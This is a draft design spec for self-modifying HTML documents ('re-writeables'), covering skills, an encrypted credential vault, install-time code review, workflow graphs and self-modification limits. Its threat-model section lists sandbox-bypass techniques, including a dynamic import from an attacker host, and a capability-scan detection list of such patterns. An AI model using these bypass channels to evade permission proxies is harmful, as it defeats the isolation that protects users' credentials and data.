# re-write-able: actions, skills, and workflows

*A design extension proposing what a re-writeable can do beyond modifying itself.*

*Draft v0.6 — resolves the v0.5 review's ambiguity in §11.12 by dropping the "trusted import" distinction (option 1: all `.rwa-skill.json` imports pre-select Worker mode). Commits to reject-with-message for skills declaring an execution mode the runtime doesn't support (§4.1). Sketches `RunResult` shape (§5.5). Pins `tested_modes` default to `['default']` (§2.1). Commits one-Worker-per-skill-instance with permitted reuse pooling (§11.12). Generalizes long-running headless implication from "watcher-style" to "long-running processes" (§3.4, §7.3). Specifies in-edit timeout behavior (§5.4). Corrects §8.2's cross-container coordination surface (bus, not state). Carry-over deferrals from v0.5 reduced to: §11.1, §11.7, §11.8, §11.9, §11.10, §11.11, §11.12 full design. The trust-mechanism question rejoins §11.9 — signing/provenance is what will eventually carry a mechanical trust signal.*

---

## 0. Why this exists

The base spec (v0.10) defines what a re-writeable is: a single `.html` file that renders itself, stores itself in IndexedDB, modifies itself through an embedded agent, and commits itself back to disk. The agent's role is bounded — it edits the document.

This extension proposes the next layer up. The same LLM that rewrites the document can take actions beyond the document — post to a blog, fetch an RSS feed, save to a file, send an email — when given a vocabulary of **skills** and (optionally) a **workflow graph** that orchestrates them. With those additions, a re-writeable can also be:

- A **tool** with action verbs (a document that can post itself to your blog)
- A **workflow** with a visual graph (a Yahoo-Pipes-style flow as a single HTML file)
- An **agent** with skills, memory, workflows, and the ability to rewrite its own workflow

These three are not three different formats. They are the same format with different content. A single rwa can be all of them at once.

The architectural pieces from v0.10 — bootstrap, document, IndexedDB stores, the bus, the LLM connection, the FSA commit flow — carry through unchanged. This extension adds:

- A **skill library** that lives in a runtime-managed IDB store, with a viewer rwa for editing
- A **credential vault** scoped by user-declared namespaces, not by origin
- A **skill installation flow** that treats install as the privileged moment, with declared permissions, install-time code review, and a capability scan to make review effective
- A **workflow document type** that renders as a node graph and is edited via a dedicated graph protocol
- A **trigger-determined persistence model** for self-modifications — manual trigger can persist via ⌘S, all other triggers produce ephemeral adaptations
- A **fork-on-share variant** for documents that carry state and capability

The constraint that does all the work in v0.10 — *one file, no server, no account, no install* — applies to every addition. The phrase "the server is convenience, not custody" (§10) is the north star; anything that violates it is rejected.

---

## 1. The agent realization

A re-writeable with self-modification (v0.10) plus skills plus workflows plus memory in IDB plus the ability to rewrite its own workflow satisfies every working definition of *agent*: it perceives (reads state), decides (LLM call), acts (skills), and remembers (IDB).

This is a recognition, not a redesign. The pieces compose without architectural disruption. What changes is the positioning — and that's a choice, not an architectural requirement. Three positioning paths exist:

**Document-first.** Present the format as documents that can rewrite themselves and (incidentally) carry workflows and skills. Trust model stays simple. Risk: under-sells what's actually here.

**Agent-first.** Present the format as the first portable agent file. Larger claim, larger upside. Risk: invites comparison with platform agents on dimensions the format isn't optimizing for (multi-tenant safety, telemetry, vendor support).

**Document-first now, agent-second later.** Ship the capability quietly. When the community builds genuinely agentic rwa's and shows them off, the agent label arrives by demonstration rather than by announcement. This is how spreadsheets became programming environments and HyperCard became a game engine.

This document specs the architecture. Working position absent contrary evidence: **document-first**. See §11.6.

---

## 2. Skills

### 2.1 What a skill is

A skill is a local capability that a re-writeable can invoke. Each skill carries:

- A **name** — stable identifier (e.g. `publish-to-blog`)
- A **version** — semantic version (`1.2.0`), used for compatibility (§2.5)
- A **description** — a sentence the LLM reads to decide if the skill applies
- An **input schema** — typed fields the skill accepts; each field may be marked `sensitive: true` to indicate it should be redacted in run history and never published in fork-on-share
- An **output schema** — typed fields the skill returns; each field may be marked `sensitive: true` with the same effect. Sensitivity is *declared per field*, not inferred from input flow.
- A **permissions manifest** — declared and best-effort enforced (§4.2; see §2.4 for the enforcement model)
- An **execution mode** — `default` or `worker` (§11.12). Author's intended mode, reflecting what they tested in and what the implementation's API surface assumes. v0.6 keeps `default` as the fully-specified mode; Worker-mode design lands in v0.7 but the manifest accepts the declaration now.
- A **`tested_modes` list** — modes the author has verified the skill works in. **When omitted, the runtime treats this as `['default']`** — the skill was installed and run successfully in default mode, so default is implicitly tested. Authors who want an explicit empty value (declaring nothing about test status) must declare `tested_modes: []` literally.
- An **implementation** — JavaScript that runs in the runtime context, subject to the permission manifest
- An optional **vault namespace** — which credential bucket the skill needs (§3)

Two contracts matter. The **interface** (name, version, description, schemas) is what documents see. The **implementation** is local to the user. A document declaring "I want to publish to a blog" matches against any local skill that satisfies the interface, regardless of what the implementation actually talks to (WordPress, Ghost, Mastodon, a static-site git push).

This is the same model as Claude's skill system and macOS "Open With" — the document carries intent; the host provides capability.

### 2.2 Where skills live

Skills live in a **runtime-managed IDB store**, `rwa_skill_library`, scoped per-origin. The store is *not* a normal document store — documents do not write to it, only the runtime does, and only through the skill installation flow (§4).

A viewer re-writeable, `skill-library.html`, provides a UI for browsing, editing, and installing skills. The viewer is one possible UI; the actual skill data lives in the IDB store and is always available regardless of whether the viewer is open. A cron-launched workflow accesses the library directly through `runtime.skills.*`; no viewer tab is needed.

The bus topic `skills:*` is runtime-reserved. Documents cannot publish into it; the runtime is the only writer. The library viewer reads through the API, not the bus.

**Hosted shares and library scope.** The library is per-origin. Local files (the null origin under `file://`) share one library. Hosted shares each get their own origin (e.g. `<short>.rewritable.<host>/`), so a workflow opened from a share URL sees an *empty* library and cannot access the recipient's installed skills. This is the right security behavior: the recipient downloads the file to local disk first, opens it from `file://`, and only then does it have access to their library. The runtime surfaces this transition explicitly when a workflow is opened from a hosted share with required skills it cannot resolve.

### 2.3 How skills are invoked

Three invocation paths:

1. **By name, from document JavaScript.** `await runtime.skills.invoke('publish-to-blog', { title, body })`. Direct and programmatic. Used when the document is essentially a script with a UI.
2. **By natural language, through the LLM.** The user presses a new keystroke — current direction: **⌘J** ("do"), distinct from **⌘K** ("edit") — and types intent. The LLM sees the list of available skills and their descriptions, picks one (or chains several), and invokes them. Used when the document is conversational, or when the user prefers intent over invocation.
3. **By graph, from a workflow.** A workflow node is a skill invocation; running the workflow runs the chain. See §5.

Consent is layered (§4.4 has the full model):

- **Installation consent** (high friction, one-time): user reviews the skill's code and permissions before it enters the library.
- **Invocation consent** (per-document or per-session, depending on sensitivity): users approve a document's first use of a sensitive skill; trivial skills (`compute` permission only) may not prompt at all.
- **Workflow manifest consent** (one prompt per workflow): a workflow declares its skill list as a manifest; the user grants the whole set on first run rather than receiving N first-time prompts in a chain.

### 2.4 Calling-skill identity, and the permission enforcement model

Permission enforcement (§4.2) requires the runtime to know *which skill* is calling `runtime.vault.get(...)`, `fetch(...)`, or any other capability API. JavaScript has no native call-site identity. The runtime resolves this by issuing **per-skill bound API surfaces** at skill load time: each skill receives its own `runtime.vault`, `runtime.bus`, `runtime.fs`, `runtime.skills`, and related objects, closed over its identity and permission manifest. The runtime also **shadows the standard capability globals** — `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `navigator.sendBeacon`, `indexedDB`, `showOpenFilePicker`, `showSaveFilePicker`, `showDirectoryPicker`, and similar — in the skill's execution scope, replacing each with a permission-checked proxy.

**This mechanism is defense-in-depth, not a sandbox.** Scope shadowing has known limitations in JavaScript:

- Dynamic `import('https://attacker.com/x.js')` resolves against the platform's module loader, not the skill's scope.
- `new Worker(URL.createObjectURL(new Blob([code])))` creates a worker with its own fresh global scope where the runtime's shadowing has no effect.
- DOM-side network access — `new Image(); img.src = url`, `<video>.src = url`, `<audio>.src = url` — uses element loaders that bypass `fetch` entirely.
- `<iframe srcdoc="...">` injected into a document creates a separate browsing context.
- `postMessage` to an opener or parent crosses into a different scope's globals.

A motivated adversarial skill author can route around the proxies. The runtime detects and blocks what it reasonably can, but the proxies are **not a hard isolation boundary against deliberate evasion.**

**The trust anchor is the install-time review** (invariant 10). When a skill enters the library, the user has seen its complete code, approved its declared permission manifest, and accepted responsibility for having reviewed it for capability access outside the declaration. The install dialog supports this review with a capability scan that flags proxy-bypassing patterns explicitly (§4.1). The boundary line is human inspection of code, supported by tooling — not runtime enforcement of declarations against adversarial intent.

The declared permission manifest serves three roles:

1. **Documentation at install time.** The user sees what the skill says it needs and can compare that against what the code does. The capability scan in §4.1 makes divergences visible.
2. **Best-effort runtime enforcement.** The proxies catch a skill that accidentally calls `fetch` to the wrong host, or whose helper library reaches into the vault on an unauthorized namespace. They protect against accident, bugs, and well-intentioned overreach — not against deliberate evasion.
3. **A contract the skill author accepts.** Declaring narrow permissions and then routing around them is a contract violation that the runtime catches in common cases.

Skills that genuinely need adversarial-grade isolation — third-party skills from sources of unclear trust, especially — can opt into Worker-mode (§11.12). Selection between `default` and `worker` mode for a given install is covered by the install-dialog model in §11.12.

The recipient of a shared workflow that wants to "publish to a blog" never receives the publisher's credentials, nor the publisher's choice of blog platform. They receive an intent that resolves against their own skill library, their own vault namespaces, on their own machine.

### 2.5 Skill versioning

Skills version semantically. A workflow's skill manifest pins major versions of its dependencies:

```javascript
{
  required_skills: [
    { name: 'publish-to-blog', major: 1 },
    { name: 'fetch-rss', major: 2 },
  ]
}
```

The library keys skills by `(name, major)`, so multiple major versions of the same skill coexist. The runtime resolves at workflow load:

- Required `(name, major)` present in library, equal or higher minor → use it.
- Required `(name, major)` present, lower minor → use it; warn if any input field referenced by the workflow is missing.
- Required `(name, major)` absent → workflow opens in read-only mode; runtime offers to install, or to remap to another installed major (with a compatibility warning).
- Multiple installed minors at the same major → use highest installed minor.

Skill authors bump major on breaking input/output schema changes; minor on additive changes; patch on implementation-only changes. Workflows that need a specific patch (e.g. for a bug fix) can pin tighter via optional `min_patch`.

---

## 3. The credential vault

### 3.1 The vault is namespace-scoped

The vault is a separate IndexedDB database, `rwa_vault`. Its access boundary is the **namespace**, not the origin. Under `file://`, all rwa files share the null origin, so an origin-scoped vault would be readable by every document on the machine — exactly the inverse of what's wanted.

Vault entries are keyed by namespace and field:

```javascript
{ namespace: 'wordpress-personal', field: 'api_token', value: '<encrypted>' }
{ namespace: 'wordpress-personal', field: 'site_url',  value: '<encrypted>' }
{ namespace: 'mastodon-mty',       field: 'token',     value: '<encrypted>' }
```

Skills declare which namespace they need at install time. The user approves the namespace declaration during installation review (§4). Skills cannot read from namespaces they don't hold. Multiple skills that hold the same approved namespace share its credentials.

**Granting access to an existing namespace is its own decision.** When a new skill requests a namespace that already holds credentials, the install dialog (§4.1) lists the skills currently using that namespace. The user grants or refuses with full visibility of who else holds the namespace.

A document cannot create a skill with arbitrary namespace access. The installation flow surfaces the requested namespace, and the user explicitly grants it.

### 3.2 The vault API

```javascript
runtime.vault = {
  set(namespace, field, value),        // skill-callable; namespace must match the calling skill's manifest
  get(namespace, field),               // skill-callable; returns null if locked or namespace unauthorized
  has(namespace, field),               // skill-callable
  namespaces(),                        // skill-callable: returns namespaces this skill is approved for
  unlock(passphrase),                  // host-context-only; not exposed through the per-skill bound runtime.vault
  lock(),                              // host-context-only; not exposed through the per-skill bound runtime.vault
  status,                              // 'locked' | 'unlocked' | 'empty'
};
```

Skill-callable methods enforce per-skill identity (§2.4). `unlock`/`lock` are host-context-only.

### 3.3 The vault never travels

**Vault contents never leave the machine they were created on, regardless of how the containing document is shared or exported.** Fork-on-share, export, embed, bus publication, library export — the vault is opaque to all of them.

A skill that needs a credential on the recipient's machine triggers the recipient's vault. If the recipient hasn't populated the relevant namespace, the skill surfaces a "vault namespace `<name>` is empty; populate it from the library viewer" message rather than failing silently.

### 3.4 Vault cryptography

- **Key derivation**: Argon2id with a per-vault salt stored alongside the encrypted entries.
- **Encryption**: AES-GCM, per-entry IV, authenticated.
- **Key cache**: derived key held in memory only; cleared on lock, on tab focus loss for >N minutes (current direction: 30), and on tab close.
- **Lost passphrase recovery**: not built in. A forgotten passphrase wipes the vault contents; credentials must be re-entered from their source systems.

**Headless and long-running implications.** In headless mode the focus-based lifecycle is moot because there is no UI. The env-var passphrase model (§7.3) supplies the passphrase at process start, derives the key once, and the key sits in memory for the lifetime of the process. For one-shot cron workflows this is brief. For **long-running headless processes** — watcher-style workflows (continuous bus subscription, persistent polling), large batch workflows that run for hours, scheduled jobs whose work happens to take a while — the derived key sits in memory for the lifetime of the process, which may be hours or days. This is acceptable under the "trusted machines only" framing (§7.3) but worth flagging so deployments understand the implication, regardless of whether the process is "watching" or "working."

*Specific Argon2id parameters (memory cost, iterations, parallelism) are deliberately not pinned here — see §11.8.*

---

## 4. Skill installation and permissions

Skill code, by design, runs with elevated privilege (vault, network, FSA, bus). **The privileged moment is installation, not invocation.** Trust is anchored when the code enters the library, not every time it executes.

### 4.1 The installation flow

Skills are added to the library via the library viewer (`skill-library.html`). Three install sources:

- **Generated by ⌘K in the library viewer.** User describes the skill they want; the LLM generates an implementation.
- **Imported from a shared skill file.** A small `.rwa-skill.json` artifact carrying a single skill's manifest and implementation, exchanged the same way rwa documents are.
- **Edited in place by the user.** Direct authoring in the library viewer's editor.

In all three cases, install requires explicit user action (an "Install" button), not just code generation or import. Until install completes, the skill is a **draft**.

**Drafts.** Drafts live in the same `rwa_skill_library` store with `status: 'draft' | 'installed'`. A draft can be invoked from the library viewer for testing, but only with `compute` permission. Drafts are not visible to documents.

**The install dialog** shows:

- The complete skill code, syntax-highlighted, readable.
- The **permissions manifest** the skill declares.
- The **vault namespace** the skill wants, with the existing-namespace disclosure (§3.1).
- The **input/output schemas**, including sensitive-field markers.
- The **execution mode** for this install (see "Mode selection at install" below).
- The **`tested_modes`** declared by the author, surfaced as accurate compatibility information.
- A **capability scan** of the skill code — see "The capability scan" below.
- A diff against the existing version if installing an update.

The user accepts the entire dialog, or doesn't. No "install with reduced permissions." If the user doesn't grant a permission, the skill doesn't install — the skill can then be edited (to drop the offending capability) and re-reviewed.

**Mode selection at install.** The install dialog exposes a user-side mode choice regardless of what the author declared. For library-authored skills (⌘K in the viewer, in-place edits), the dialog defaults to the author's declared mode. **For all `.rwa-skill.json` imports, the dialog pre-selects Worker mode** with a note: "This skill was authored for `<author's declared mode>` and tested in `<tested_modes>`. We recommend Worker mode for imported skills; some functionality may not work if the author hasn't tested it." The user can override the pre-selection in either direction. The full mode-selection rationale is in §11.12.

**Mode availability check.** When a skill manifest declares `execution: 'worker'` and the runtime does not support Worker mode (e.g. a pre-v0.7 runtime, or a future runtime that has dropped Worker support), the install is **rejected with a message**: "This skill is declared for Worker mode (`execution: 'worker'`), which this runtime does not support. Install a runtime version that supports Worker mode, or edit this skill to declare `execution: 'default'` after reviewing whether default mode is appropriate for your trust posture." The runtime does not silently fall back to default mode — silent fallback would undermine the security commitment the author made by declaring `worker` in the first place, exactly when the user is least likely to notice. Mode mismatch is a hard install failure, surfaced to the user, never quietly resolved.

**The capability scan.** The runtime maintains a curated list of capability-bearing patterns; the list grows with the web platform. v0.6 commits to the *pattern* (a maintained list, surfaced to the reviewer at install time) rather than to a fixed enumeration. Current coverage includes the proxy-bypass channels named in §2.4 (`importScripts`, dynamic `import`, `new Worker` with blob URLs, `<iframe srcdoc>`, `postMessage`, element `.src` to remote URLs) plus `WebSocket`, `EventSource`, `navigator.sendBeacon`, `<link rel="preload"/"prefetch">`, `<script>` injection, `RTCPeerConnection`, `navigator.serviceWorker.register`, `document.cookie`, `eval`, `new Function`, and `setTimeout`/`setInterval` with a string argument. Each flagged pattern is surfaced with: "Note: this skill uses `<pattern>`; the permission manifest does not constrain this directly. Review the code."

The capability scan is itself layered defense, not adversarial-proof. Trivial obfuscation defeats substring or token-level matching. The runtime cannot reliably catch all of these — what it *can* do is detect that the code *looks obfuscated* and surface that fact as its own signal: "This skill contains patterns suggesting deliberate obfuscation. Read carefully before installing." Obvious obfuscation is itself a flag, regardless of what it's hiding. The scan's job is to make the human review as effective as it can be, not to replace it.

### 4.2 Permission tiers

Each skill declares its capabilities as a manifest. The runtime enforces these at every API boundary via the per-skill bound API proxies (§2.4) on a best-effort basis.

| Permission | Declaration | Best-effort enforces |
|---|---|---|
| `compute` | Implicit (all skills) | Data manipulation only — no I/O |
| `network:<domains>` | List of origin patterns | `fetch` to those domains only (other network paths flagged at install per §4.1) |
| `vault:<namespace>` | Single namespace | Read/write that vault namespace only |
| `fsa:<patterns>` | Glob patterns | FSA operations under matching paths |
| `bus:<topics>` | Topic patterns (read, write, both) | Bus operations on matching topics |
| `idb:<store>` | Single document IDB store | Read/write that store in the running container's IDB (§8.2 for sub-workflow scoping) |

A skill that wants to `fetch` arbitrary URLs needs `network:*`, and the install dialog surfaces that as a wildcard with a stronger warning.

**Pattern syntax** for each tier is deferred to §11.10.

### 4.3 The back door is closed

Skills cannot install other skills. The `runtime.skills.install(...)` API is not exposed to skill code at all.

### 4.4 Sensitivity and consent under load

- **`compute`-only skills**: no prompt on first invocation. Consent is satisfied by install review.
- **Skills with any I/O permission**: prompt on first invocation per document, with "remember for this document" / "remember for this session" / "ask each time" options.
- **Workflows**: declare a `skill_manifest` listing every skill they invoke. On first run, the user reviews and grants the entire manifest once.

---

## 5. Workflows

### 5.1 The workflow document type

A workflow re-writeable's primary content is a **directed graph** of skill invocations. The graph lives in IndexedDB under `rwa_workflow`:

```javascript
{
  version: '1.0',
  nodes: [
    {
      id: '7k3p2m9q',
      type: 'skill',                   // skill | primitive | input | output
      skill: 'fetch-rss',
      skill_version: { major: 2 },
      primitive: 'split',
      config: { url: 'https://…' },
      position: { x, y },              // optional; runtime auto-lays-out when omitted
    },
  ],
  edges: [
    { from: nodeId, to: nodeId, predicate: null | '<expr>', kind: 'normal' | 'error' },
  ],
  trigger: 'manual' | 'on_open' | 'cron:<expr>' | 'on_change:<bus_key>',
  skill_manifest: [
    { name: 'fetch-rss',       major: 2 },
    { name: 'publish-to-blog', major: 1 },
  ],
  concurrency: 'skip' | 'queue' | 'parallel',
  history_cap: 100,
}
```

When `trigger` is omitted, the runtime defaults to `manual`.

### 5.2 The graph editing protocol

⌘K on a workflow rwa dispatches `rwa-graph/1`, parallel to `rwa-edit/1`:

- `graph_add_node({ type, skill?, primitive?, config, position? })`
- `graph_remove_node({ id })`
- `graph_modify_node({ id, changes })`
- `graph_add_edge({ from, to, predicate?, kind? })`
- `graph_remove_edge({ from, to })`
- `graph_modify_edge({ from, to, changes })`
- `graph_set_trigger({ trigger })` — see §6 for restrictions

Operations are applied atomically. A failed operation rolls back the entire batch. The previous graph state is pushed onto `rwa_undo`; ⌘Z walks it back.

### 5.3 Execution semantics

Three trigger modes (default: `manual`).

**User-clicked Run** — clicks on the *runtime's* Run button (in the viewer chrome or status bar) — is always treated as a manual run. Document-provided UI that invokes `runtime.workflow.run()` is **programmatic invocation**, which falls under the declared trigger's persistence rules (§6.2). The runtime can attest to its own UI; it cannot attest to user intent behind document JS calling `run()`.

Within a run, execution is async and non-blocking. Errors halt the affected branch; an `error`-kind edge redirects failure to a recovery branch.

### 5.4 Concurrency and the execution mutex

The per-workflow execution mutex covers three operations: workflow runs, user ⌘K edits, and programmatic graph modifications via `runtime.modify({ scope: 'graph' })`.

While any of these is in progress, the others queue or skip per the `concurrency` policy: `skip` (default), `queue` (FIFO, default cap 3, cancellable before start), or `parallel` (last-write-wins on `runtime.workflow.state`).

One rule holds regardless of `concurrency`: **while the user is editing the workflow graph, autonomous-trigger runs are always skipped** with a log entry. "Editing" is defined as any of:

- The ⌘K lens is open in the viewer (per v0.10's lens spec — input field visible and accepting focus).
- A `rwa-graph/1` batch has been dispatched and the runtime has not yet applied it or rolled it back.
- The viewer's editor has uncommitted IDB writes — graph operations queued from the editor's UI but not yet flushed to `rwa_workflow`.

**In-edit timeout.** The dispatched-batch state (the second condition) inherits the dispatch timeout from `rwa-edit/1` (v0.10 main spec). When that timeout fires, the batch is treated as rolled-back for mutex purposes: the autonomous run that was waiting proceeds, and a timeout entry is added to `rwa_workflow_notifications` (§5.6) so the user sees what happened. Any user input that had been accepted into the lens before the timeout is preserved as an unsubmitted draft in the viewer; the user can retry the prompt or discard it. Autonomous runs never wait indefinitely on a non-responsive LLM call.

### 5.5 State across runs and the run API

```javascript
runtime.workflow = {
  state: {
    get(key),
    put(key, value),
    has(key),
    list(prefix),
  },
  run(input?),                         // programmatic invocation; returns Promise<RunResult>
  current: {                           // accessor for the running run, if any
    id,
    started_at,
    triggered_by: 'manual' | 'on_open' | 'cron' | 'on_change' | 'programmatic',
  },
  history,                             // last N RunResult entries; N = workflow.history_cap (default 100)
};
```

`runtime.workflow.state` backs onto `rwa_workflow_state` and survives across runs, commits, and sessions.

`runtime.workflow.run(input?)` triggers a run of the current workflow with optional input bound to the workflow's input node. Invocations through this API count as **programmatic** for persistence purposes (§6.2). Document UI wanting user-intent persistence semantics should ⌘S after the run completes, or expose its functionality through the runtime's Run button rather than through document JS.

**`RunResult` shape.**

```javascript
{
  id,                                  // run UUID
  status: 'success' | 'error' | 'halted',
  started_at,                          // timestamp
  ended_at,                            // timestamp; equal to started_at + duration
  triggered_by,                        // same enum as runtime.workflow.current.triggered_by
  outputs: { [output_node_id]: value }, // keyed by output-node id; values per output schema
  error: null | { node_id, message, kind },  // populated when status !== 'success'
  tokens_used,                         // total tokens consumed; counts against §5.7 caps
  modifications,                       // count of self-modifications during this run (for §6.3 caps)
}
```

Sensitive fields in outputs (per the relevant skill's output schema, §2.1) are redacted in `RunResult.outputs` just as they are in run history. A `RunResult` returned from `runtime.workflow.run()` to document code carries the same redactions the run history shows — the API does not bypass sensitivity declarations.

Run history is the structured stream of `RunResult`s, with input fields also recorded per node (and redacted per the input schema). Workflow authors tune `history_cap`; entries beyond the cap drop FIFO.

### 5.6 Failure visibility

Failure events write to `rwa_workflow_notifications` (FIFO, capped at 100, newest at top, oldest dropped). Optionally emits to the OS notification system (opt-in) and writes a structured log file to a user-configured FSA path (opt-in).

"Failure" includes skill invocation errors, vault-locked errors, missing-skill errors, timeout, quota-exceeded events from §5.7, and the in-edit timeout from §5.4.

### 5.7 Cost model

- **Token counting**: input + output combined, summed across calls in a run.
- **Per-run cap**: default 100k. Workflow can declare higher.
- **Per-day cap**: default 500k tokens in a 24-hour window. Higher caps need install-time confirmation if they exceed the runtime's threshold (default 1,000,000 tokens/day).
- **Soft warning**: at 80%. **Hard stop**: at 100%.

**Counter location.** The per-day counter lives in `rwa_workflow_state` under a runtime-reserved key (parallel to the per-24h modification counter in §6.3). Survives `history_cap` truncation.

Local-LLM fallback is deferred (§11.7).

---

## 6. Self-modifying workflows

### 6.1 `runtime.modify` semantics

```javascript
runtime.modify(instruction, { scope?: 'graph' | 'document' })
```

- Mutually exclusive with user-triggered ⌘K and with workflow runs via the per-workflow execution mutex (§5.4).
- Surfaces token cost (counts against per-run and per-day caps in §5.7).
- Returns a Promise.
- Subject to the rate limits in §6.3.

`scope: 'graph'` targets the workflow graph; `scope: 'document'` targets the document body. Neither targets the bootstrap.

### 6.2 The commit gate, by trigger

The runtime cannot reliably tell whether a given Chrome launch was a user double-click or `cron`. So the spec does not ask. It asks **what triggered the run** — declared in the workflow and unambiguous at runtime.

**Self-modifications persist only when the run is initiated by the manual trigger and the user explicitly commits via ⌘S.**

- **Manual trigger (user-clicked Run on the runtime's UI, §5.3).** Self-modifications land in IDB. The user can ⌘Z and ⌘S.
- **All other triggers (`on_open`, `cron:*`, `on_change:*`), and programmatic invocations via `runtime.workflow.run()`.** Self-modifications land in IDB temporarily — the workflow can adapt within the run. *At run end, the graph is reset from the inline snapshot.*

`rwa_workflow_state` persists between runs regardless of trigger. Only the workflow *structure* resets after a non-manual run.

The on-disk file is always the source of truth for what an autonomous workflow *is*. A user who wants a scheduled adaptation to stick pulls up the workflow manually, clicks Run on the runtime UI, lets it adapt, and ⌘S's.

The runtime enforces the rule by inspecting the workflow's declared trigger and the call site, not by detecting headless mode.

### 6.3 Self-modification rate limits

- **Per-run cap**: default 1, in-memory. Workflow can declare higher with user confirmation at install.
- **Per-24h cap**: default 10 across all *manual-trigger* runs in a 24-hour window. Persisted in `rwa_workflow_state`. Non-manual runs are bounded by the per-run cap plus the cost model (§5.7); their modifications don't persist anyway.

### 6.4 Hard constraints

- **Triggers cannot be modified by self-modification.** Trigger changes go through `graph_set_trigger`, authorized only by user ⌘K.
- **The skill manifest cannot be expanded by self-modification.**
- **The bootstrap is sacrosanct.**

---

## 7. Scheduling and headless execution

### 7.1 The format is the same

A workflow file is the same file regardless of how it's run. Persistence behavior is identical across openers — what changes is who initiated the run.

### 7.2 Three flavors of unattended execution

**A. Open in normal Chrome on a schedule** via cron / Task Scheduler.
**B. Headless Chrome with a persistent profile** (`chrome --headless=new --user-data-dir=...`).
**C. A companion CLI** — out of scope for this spec.

### 7.3 The vault for unattended runs

- **Environment variable.** Passphrase in the cron environment. For one-shot workflows the key lifetime equals the process lifetime. For **long-running processes** — watchers, large batches, persistent listeners — the derived key sits in memory for as long as the process runs. See §3.4 for the implication.
- **OS keychain.** Fetch passphrase from Keychain / GNOME Keyring / Credential Manager.
- **Unattended-mode vault.** Less-protected vault with credentials marked headless-safe.

Current direction: ship environment-variable as the v1 answer ("for trusted machines only").

---

## 8. Composition

### 8.1 Skills + workflows + the bus

Workflows can read from `runtime.shared.get('source:topic')`, subscribe to bus changes as event triggers (`trigger: 'on_change:<bus_key>'`), and publish outputs for other workflows to consume. Unix-pipe model at the rwa scale.

### 8.2 Workflows referencing other workflows

A workflow node can be another workflow file. Sub-workflow execution happens in an isolated iframe (§5.8 main spec). Permission scoping:

- **`idb:<store>`** resolves against the *running container's* IDB.
- **`bus:<topics>`** is scoped to a **parent-prefixed sub-bus**: `<immediate_parent_id>/<topic>`. Prefix is *not* cumulative — a grandchild sees `<my_parent_id>/<topic>`. Each level isolates from its grandparent.

**Cost accounting.** The cost caps in §5.7 are *per-container*. A workflow loading sub-workflows from URLs inherits one cap per container. Per-container caps are the right shape because each sub-workflow's installation went through its own review and the composition is visible in the graph.

Workflows that want a coordinated budget across a composition do so through the **bus** (`runtime.shared`), not `runtime.workflow.state` — state is per-container and doesn't cross composition boundaries. Typically: the parent publishes a budget topic, sub-workflows subscribe and check before invoking LLM calls, and update the topic when they spend. The runtime does not enforce composition-wide caps; this is one of the explicit coordination patterns the bus exists to support.

---

## 9. Fork-on-share for tools and agents

[Fork-on-share](https://www.ikangai.com/fork-on-share/) for workflows and agents:

- **Always included.** The workflow graph, document content, configuration constants. Skill references travel as `(name, major_version)` pairs.
- **Never included.** The vault. Anything in `rwa_vault`. Skill implementations. Any input or output fields marked `sensitive: true`, including their appearances in run history.
- **Publisher's choice.** Non-sensitive run history, `rwa_workflow_state`.

The default is conservative. The recipient receives a fresh agent with the same shape, no inherited credentials, no inherited memory.

---

## 10. The "you stay in control" framing

**The server is convenience, not custody.**

- Share URL: convenience for delivery; once ⌘S, recipient owns it.
- Hosted rwa: convenience for installless access; copy locally, remote becomes optional.
- Cron run: convenience for unattended execution; the file moves.
- Skill library across machines: convenience for portability; skills run locally regardless.

None of these doubles as a leash. Compare to platform agents — Zapier, n8n SaaS, IFTTT, Custom GPTs — where convenience and leash are the same thing.

The agent is the file. The file is yours. Every other agent infrastructure is *rented*; the rwa form refuses the custodian.

---

## 11. Open questions

### 11.1 Skill discovery between machines

Workflows declare required skills by name + major version. A documented common skill set ships with the format. Exact membership deferred.

### 11.2 What counts as a "skill" vs. a primitive

Primitives are pure. Skills are everything else. `transform` uses `new Function()` with a restricted globals set.

### 11.3 Multi-user agents on shared machines

Single-file rule survives: "this is one user's tool."

### 11.4 The schedule UI

Schedule setup stays out of the format.

### 11.5 What ships first: workflows or skills

Skills first.

### 11.6 The agent label

Working position: document-first.

### 11.7 Local-LLM fallback configuration

Deferred. Also: how token counting normalizes across providers in mixed workflows.

### 11.8 Vault crypto parameter pinning

Argon2id parameters need a review pass against a current threat model.

### 11.9 Skill share file format

`.rwa-skill.json` envelope, signature/integrity story, install-from-share UX unspecified. This is where the eventual mechanical trust signal for imports will live — once a skill share file can carry a verifiable signature against a user-trusted source, the install dialog can derive trust mechanically rather than asserting it. Until then, all imports get the "pre-select Worker mode" treatment in §11.12, and "trusted import" is not a runtime distinction.

### 11.10 Permission pattern syntax

Critical anti-escalation rules: no left-unanchored wildcards on network domains, mandatory anchoring on FSA path patterns, explicit separation of read and write scopes on bus topics. Grammar deferred.

### 11.11 Draft skill UI surface

Visibility across browser tabs, mid-run cancellation, result surfacing.

### 11.12 Worker-mode skills

Skills declaring `execution: 'worker'` in their manifest run in a dedicated Web Worker. This provides stronger isolation than the defense-in-depth proxies of §2.4 — but the strength comes from a combination of mechanisms, not from Worker-launch alone.

**The mode-selection model (resolved in v0.6):**

- The skill manifest declares `execution: 'default' | 'worker'` — the author's intended mode.
- The manifest also declares `tested_modes: ['default']` or `['default', 'worker']` — modes the author has verified. Omitted defaults to `['default']` (§2.1). Used by the install dialog for accurate compatibility information.
- The install dialog exposes a **user-side mode choice** at install time, regardless of what the author declared.
- For library-authored skills (⌘K in the viewer, in-place edits), the dialog defaults to the author's declared mode.
- **For all `.rwa-skill.json` imports, the dialog pre-selects Worker mode** with a note referencing the author's declared mode and `tested_modes`. The user can override.

Authors who care about import safety opt into testing in both modes — they bear the cost of supporting Worker mode rather than every author paying it.

The previous draft distinguished between "trusted" and "untrusted" `.rwa-skill.json` imports. v0.6 collapses the distinction: there is no defined trust signal for imports today, and pretending otherwise hides an open question rather than answering it. All imports get the pre-select-Worker treatment until §11.9 lands a mechanical trust signal (signature, provenance metadata) — at which point this section will pick up the signal and use it to inform the default. Users who want to override Worker-mode for a known-good import retain that ability through the dialog.

**Worker instance semantics:** Each skill *instance* runs in its own dedicated Web Worker. "Dedicated" here distinguishes from Service Worker (which is shared across pages) and means each running invocation has a Worker scoped to that invocation. The runtime is permitted to **pool and reuse** Workers across invocations of the same skill within the same container session — a pooled Worker is reset to the skill's load state between invocations and never carries another skill's identity. This is a performance optimization, not a sharing model. The identity-at-boundary guarantee holds: messages from a Worker are authenticated as coming from one specific skill, regardless of pooling.

